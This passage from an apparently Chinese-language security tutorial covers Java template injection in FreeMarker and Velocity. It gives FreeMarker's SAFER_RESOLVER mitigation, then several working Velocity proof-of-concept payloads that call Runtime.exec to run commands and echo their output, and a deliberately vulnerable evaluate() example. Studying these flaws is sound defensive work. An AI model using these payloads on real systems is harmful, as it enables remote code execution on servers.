class="hljs-number">0.</span><span class="hljs-number">.999999999</span> as _&gt;<br>    &lt;#assign <span class="hljs-type">byte</span>=is.read()&gt;<br>    &lt;#<span class="hljs-keyword">if</span> <span class="hljs-type">byte</span> == -<span class="hljs-number">1</span>&gt;<br>        &lt;#<span class="hljs-keyword">break</span>&gt;<br>    &lt;/#<span class="hljs-keyword">if</span>&gt;<br>$&#123;<span class="hljs-type">byte</span>&#125;, &lt;/#list&gt;]<br></code></pre></td></tr></table></figure><h4 id="修复和防御"><a href="#修复和防御" class="headerlink" title="修复和防御"></a>修复和防御</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Configuration</span> <span class="hljs-variable">cfg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>();<br>cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);<br></code></pre></td></tr></table></figure><p>设置cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);，它会加入一个校验，将freemarker.template.utility.JythonRuntime、freemarker.template.utility.Execute、freemarker.template.utility.ObjectConstructor过滤。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> freemarker.core.TemplateClassResolver;<br><span class="hljs-keyword">import</span> freemarker.template.Configuration;<br><span class="hljs-keyword">import</span> freemarker.template.Template;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileWriter;<br><span class="hljs-keyword">import</span> java.io.Writer;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exec_pcc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//1.创建配置类</span><br>        <span class="hljs-type">Configuration</span> <span class="hljs-variable">configuration</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>(Configuration.getVersion());<br>        <span class="hljs-comment">//2.设置模板所在的目录</span><br>        configuration.setDirectoryForTemplateLoading(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/Users/zhenghan/Projects/FreeMarker_test/src/main/resources&quot;</span>));<br>        <span class="hljs-comment">//3.设置字符集</span><br>        configuration.setDefaultEncoding(<span class="hljs-string">&quot;utf-8&quot;</span>);<br>        <span class="hljs-comment">//4.加载模板</span><br>        <span class="hljs-type">Template</span> <span class="hljs-variable">template</span> <span class="hljs-operator">=</span> configuration.getTemplate(<span class="hljs-string">&quot;exec_poc1.ftl&quot;</span>);<br><br>        <span class="hljs-comment">// 增加elements安全过滤</span><br>        configuration.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);<br><br>        <span class="hljs-comment">//5.创建数据模型</span><br>        Map map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;张三&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;欢迎来到我的博客！&quot;</span>);<br>        <span class="hljs-comment">//6.创建Writer对象</span><br>        <span class="hljs-type">Writer</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/Users/zhenghan/Projects/FreeMarker_test/src/main/resources/exec_poc1.html&quot;</span>));<br>        <span class="hljs-comment">//7.输出</span><br>        template.process(map, out);<br>        <span class="hljs-comment">//8.关闭Writer对象</span><br>        out.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>从 <strong>2.3.17</strong>版本以后，官方版本提供了三种TemplateClassResolver对类进行解析：</p><ol><li><p>UNRESTRICTED_RESOLVER：可以通过 <code>ClassUtil.forName(className)</code> 获取任何类。</p></li><li><p>SAFER_RESOLVER：不能加载 <code>freemarker.template.utility.JythonRuntime</code>、<code>freemarker.template.utility.Execute</code>、<code>freemarker.template.utility.ObjectConstructor</code>这三个类。</p></li><li><p>ALLOWS_NOTHING_RESOLVER：不能解析任何类。</p></li></ol><p>可通过<code>freemarker.core.Configurable#setNewBuiltinClassResolver</code>方法设置<code>TemplateClassResolver</code>，从而限制通过<code>new()</code>函数对<code>freemarker.template.utility.JythonRuntime</code>、<code>freemarker.template.utility.Execute</code>、<code>freemarker.template.utility.ObjectConstructor</code>这三个类的解析。</p><h2 id="Velocity-SSTI"><a href="#Velocity-SSTI" class="headerlink" title="Velocity SSTI"></a>Velocity SSTI</h2><p>主要参考：<a href="https://www.cnblogs.com/LittleHann/p/17846825.html#_lab2_0_5">Java模版引擎注入（SSTI）漏洞研究 - 郑瀚 - 博客园 (cnblogs.com)</a></p><p>​  <a href="https://garck3h.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/#evaluate%E8%A7%A6%E5%8F%91">velocity的SSTI复现与分析 (garck3h.github.io)</a></p><h3 id="Velocity基本语法"><a href="#Velocity基本语法" class="headerlink" title="Velocity基本语法"></a>Velocity基本语法</h3><p><code>#</code> 关键字<br>Velocity关键字都是使用 <code>#</code>开头的，如 <code>#set</code>、<code>#if</code>、<code>#else</code>、<code>#end</code>、<code>#foreach</code> 等<br><code>$</code>变量<br>Velocity变量都是使用$开头的，如：<code>$name</code>、<code>$msg</code><br><code>&#123;&#125;</code>变量<br>Velocity对于需要明确表示的Velocity变量，可以使用 <code>&#123;&#125;</code> 将变量包含起来。<br><code>！</code>变量<br>如果某个Velocity变量不存在，那么页面中就会显示<code>$xxx</code>的形式，为了避免这种形式，可以在变量名称前加上！。如页面中含有<code>$msg</code>，如果msg有值，将显示msg的值；如果不存在就会显示<code>$msg</code>。这是我们不希望看到的，为了把不存在的变量显示为空白，可以使用<code>$!msg</code>。</p><p>此处的攻击面还是以文件上传和模板编写为主</p><h3 id="Velocity-SSTI漏洞风险面poc"><a href="#Velocity-SSTI漏洞风险面poc" class="headerlink" title="Velocity SSTI漏洞风险面poc"></a>Velocity SSTI漏洞风险面poc</h3><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="web程序中弹出msg"><a href="#web程序中弹出msg" class="headerlink" title="web程序中弹出msg"></a>web程序中弹出msg</h5><p>写一个Demo</p><p>新建一个Maven项目，引入Velocity依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.velocity<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>velocity-engine-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>       <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在resource目录下创建模板文件，以.vm后缀命名</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br>hello , $&#123;name&#125; !<br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>主程序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang;<br><br><span class="hljs-keyword">import</span> org.apache.velocity.Template;<br><span class="hljs-keyword">import</span> org.apache.velocity.VelocityContext;<br><span class="hljs-keyword">import</span> org.apache.velocity.app.Velocity;<br><br><span class="hljs-keyword">import</span> java.io.FileWriter;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">velocityDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// 1、设置velocity资源加载器</span><br>        <span class="hljs-type">Properties</span> <span class="hljs-variable">prop</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>        prop.put(<span class="hljs-string">&quot;file.resource.loader.class&quot;</span>, <span class="hljs-string">&quot;org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader&quot;</span>);<br>        <span class="hljs-comment">// 2、初始化velocity引擎</span><br>        Velocity.init(prop);<br>        <span class="hljs-comment">// 3、创建velocity容器</span><br>        <span class="hljs-type">VelocityContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VelocityContext</span>();<br>        <span class="hljs-comment">// 向容器中放入数据</span><br>        context.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;外部输入的消息&quot;</span>);<br>        <span class="hljs-comment">// 4、加载velocity模板</span><br>        <span class="hljs-type">Template</span> <span class="hljs-variable">tpl</span> <span class="hljs-operator">=</span> Velocity.getTemplate(<span class="hljs-string">&quot;vms/velocityDemo.vm&quot;</span>, <span class="hljs-string">&quot;utf-8&quot;</span>);<br>        <span class="hljs-comment">// 5、合并数据到模板</span><br>        <span class="hljs-type">FileWriter</span> <span class="hljs-variable">fw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-string">&quot;src/main/resources/velocityDemo.html&quot;</span>);<br>        tpl.merge(context, fw);<br>        <span class="hljs-comment">// 6、释放资源</span><br>        fw.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>模板文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    #if($msg)<br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;$!msg&#x27;</span>);</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>    #end<br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>运行主程序后可以看到模板成功注入，主程序将前台页面的显示写在html文件中，可以看到网页会弹出消息</p><p><img src="/img/ssti(java)/ssti18.png"></p><h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><h6 id="poc1"><a href="#poc1" class="headerlink" title="poc1"></a>poc1</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    #set($e=&quot;e&quot;)<br>$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;Calc&quot;)<br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>mac命令为open -a Calculator</p><p>运行主程序后看到成功弹出计算器</p><p><img src="/img/ssti(java)/ssti19.png"></p><h6 id="poc2"><a href="#poc2" class="headerlink" title="poc2"></a>poc2</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br>    #set($x=&#x27;&#x27;)##<br>#set($rt = $x.class.forName(&#x27;java.lang.Runtime&#x27;))##<br>#set($chr = $x.class.forName(&#x27;java.lang.Character&#x27;))##<br>#set($str = $x.class.forName(&#x27;java.lang.String&#x27;))##<br>#set($ex=$rt.getRuntime().exec(&#x27;whoami&#x27;))##<br>$ex.waitFor()<br>#set($out=$ex.getInputStream())##<br>#foreach( $i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end<br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>注入命令需要网页有回显位，或者将回显数据注入到一个文件中</p><p>如此处构造主程序会合并数据到模板</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">FileWriter</span> <span class="hljs-variable">fw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-string">&quot;src/main/resources/velocityDemo.html&quot;</span>);<br>tpl.merge(context, fw);<br></code></pre></td></tr></table></figure><p>看到回显</p><p><img src="/img/ssti(java)/ssti20.png"></p><h6 id="poc3"><a href="#poc3" class="headerlink" title="poc3"></a>poc3</h6><p>控制程序中有执行命令语句，编写poc让其执行并输出数据</p><p>主程序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.velocity.Template;<br><span class="hljs-keyword">import</span> org.apache.velocity.VelocityContext;<br><span class="hljs-keyword">import</span> org.apache.velocity.app.Velocity;<br><br><span class="hljs-keyword">import</span> java.io.FileWriter;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.Date;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">velocityDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// 1、设置velocity资源加载器</span><br>        <span class="hljs-type">Properties</span> <span class="hljs-variable">prop</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>        prop.put(<span class="hljs-string">&quot;file.resource.loader.class&quot;</span>, <span class="hljs-string">&quot;org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader&quot;</span>);<br>        <span class="hljs-comment">// 2、初始化velocity引擎</span><br>        Velocity.init(prop);<br>        <span class="hljs-comment">// 3、创建velocity容器</span><br>        <span class="hljs-type">VelocityContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VelocityContext</span>();<br>        <span class="hljs-comment">// 向容器中放入数据</span><br>        context.put(<span class="hljs-string">&quot;cmd&quot;</span>, <span class="hljs-string">&quot;whoami&quot;</span>);<br>        <span class="hljs-comment">// 4、加载velocity模板</span><br>        <span class="hljs-type">Template</span> <span class="hljs-variable">tpl</span> <span class="hljs-operator">=</span> Velocity.getTemplate(<span class="hljs-string">&quot;vms/velocityDemo.vm&quot;</span>, <span class="hljs-string">&quot;utf-8&quot;</span>);<br>        <span class="hljs-comment">// 5、合并数据到模板</span><br>        <span class="hljs-type">FileWriter</span> <span class="hljs-variable">fw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-string">&quot;/Users/zhenghan/Projects/Velocity_test/src/main/resources/velocityDemo.html&quot;</span>);<br>        tpl.merge(context, fw);<br>        <span class="hljs-comment">// 6、释放资源</span><br>        fw.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>模板文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br>    #set ($e=&quot;exp&quot;)<br>#set ($a=$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec($cmd))<br>#set ($input=$e.getClass().forName(&quot;java.lang.Process&quot;).getMethod(&quot;getInputStream&quot;).invoke($a))<br>#set($sc = $e.getClass().forName(&quot;java.util.Scanner&quot;))<br>#set($constructor = $sc.getDeclaredConstructor($e.getClass().forName(&quot;java.io.InputStream&quot;)))<br>#set($scan=$constructor.newInstance($input).useDelimiter(&quot;/A&quot;))<br>#if($scan.hasNext())<br>    $scan.next()<br>#end<br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>运行主程序后看到回显数据</p><p><img src="/img/ssti(java)/ssti21.png"></p><h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><h5 id="evaluate触发"><a href="#evaluate触发" class="headerlink" title="evaluate触发"></a>evaluate触发</h5><p>evaluate方法使用VelocityEngine的evaluate方法来执行Velocity模板的评估。用户输入通过HttpServletRequest对象获取，并放入VelocityContext中进行渲染。</p><p>接下来简单分析一下velocity存在漏洞的风险代码原理</p><p>主程序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.velocity.VelocityContext;<br><span class="hljs-keyword">import</span> org.apache.velocity.app.Velocity;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.StringWriter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">velocityDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;外部攻击者可控输入&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">templateString</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Hello, &quot;</span> + username + <span class="hljs-string">&quot; | Full name: $name, phone: $phone, email: $email&quot;</span>;<br><span class="hljs-comment">//初始化velocity引擎</span><br>        Velocity.init();<br>        <span class="hljs-comment">//创建velocity容器</span><br>        <span class="hljs-type">VelocityContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VelocityContext</span>();<br>        <span class="hljs-comment">//向容器中放入数据</span><br>        ctx.put(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;Little Hann&quot;</span>);<br>        ctx.put(<span class="hljs-string">&quot;phone&quot;</span>, <span class="hljs-string">&quot;123456789&quot;</span>);<br>        ctx.put(<span class="hljs-string">&quot;email&quot;</span>, <span class="hljs-string">&quot;zhenghan.zh@alibaba-inc.com&quot;</span>);<br><br>        <span class="hljs-type">StringWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>();<br>        <span class="hljs-comment">// 将模板字符串和上下文对象传递给Velocity引擎进行解析和渲染</span><br>        Velocity.evaluate(ctx, out, <span class="hljs-string">&quot;test&quot;</span>, templateString);<br><br>        <span class="hljs-comment">// 输出velocity渲染结果</span><br>        System.out.println(out.toString());<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>模拟注入攻击</p><p>将payload传入username</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 